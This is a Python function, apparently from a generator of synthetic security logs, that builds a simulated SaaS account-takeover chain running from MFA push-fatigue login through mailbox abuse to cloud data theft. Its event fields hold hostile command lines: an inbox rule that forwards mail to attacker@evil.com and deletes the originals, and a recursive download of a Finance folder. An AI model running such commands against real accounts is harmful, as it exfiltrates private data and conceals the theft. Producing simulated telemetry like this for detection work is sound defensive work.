import random
from typing import Any, Dict, List

from ..builder import build_base_event
from .common import _append_and_maybe_stop, _rand_hash, _shared_context


def saas_account_takeover_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """SaaS ATO leading to mailbox abuse and cloud downloads."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "saas_account_takeover",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "action": "allowed",
        },
    )
    evt1["authentication"] = {
        "provider": random.choice(["okta", "entra"]),
        "mfa": "push_fatigue",
        "new_device": True,
        "geo": random.choice(["NG", "BR", "CN"]),
    }
    evt1["user_agent"] = {"original": random.choice(["Okta-Android/1.0", "Okta-iOS/7.2"])}
    evt1["network"]["direction"] = "inbound"
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(120, 360),
        ctx,
        overrides={
            **shared,
            "category": "saas_account_takeover",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "persistence", "sequence": 2},
            "action": "logged",
        },
    )
    evt2["authentication"] = {
        "provider": "office365",
        "device": "unknown_chrome",
        "geo": random.choice(["AE", "RU", "VN"]),
    }
    evt2["logon"] = {"type": "sso", "status": "success"}
    evt2["network"]["direction"] = "inbound"
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(600, 1200),
        ctx,
        overrides={
            **shared,
            "category": "mailbox_rule_abuse",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "collection", "sequence": 3},
            "action": "logged",
        },
    )
    evt3["process"] = {
        "name": "powershell.exe",
        "command_line": "New-InboxRule -Name AutoForward -ForwardTo attacker@evil.com -DeleteMessage $true",
    }
    evt3["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt3):
        return events

    evt4 = build_base_event(
        start_ts + random.randint(900, 1800),
        ctx,
        overrides={
            **shared,
            "category": "mailbox_rule_abuse",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "exfiltration", "sequence": 4},
            "action": random.choice(["blocked", "allowed"]),
        },
    )
    evt4["http"] = {"method": "POST", "response": {"status_code": random.choice([200, 202, 403])}}
    evt4["url"] = {"full": f"https://graph.microsoft.com/v1.0/users/{shared['user'].get('Username', 'user')}/messages?$top=200"}
    evt4["file"] = {
        "path": "/tmp/mail_export.pst",
        "extension": "pst",
        "size": random.randint(7_000_000, 15_000_000),
        "hash": {"sha256": _rand_hash()},
    }
    evt4["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt4):
        return events

    evt5 = build_base_event(
        start_ts + random.randint(1500, 3200),
        ctx,
        overrides={
            **shared,
            "category": "cloud_storage_mass_download",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "collection", "sequence": 5},
            "action": "logged",
        },
    )
    evt5["process"] = {
        "name": "gdrive",
        "command_line": "gdrive download --query \"'Finance' in parents\" --recursive",
    }
    evt5["cloud"] = {"provider": "gcp", "service": {"name": "drive"}}
    evt5["network"]["direction"] = "outbound"
    _append_and_maybe_stop(events, evt5)

    return events
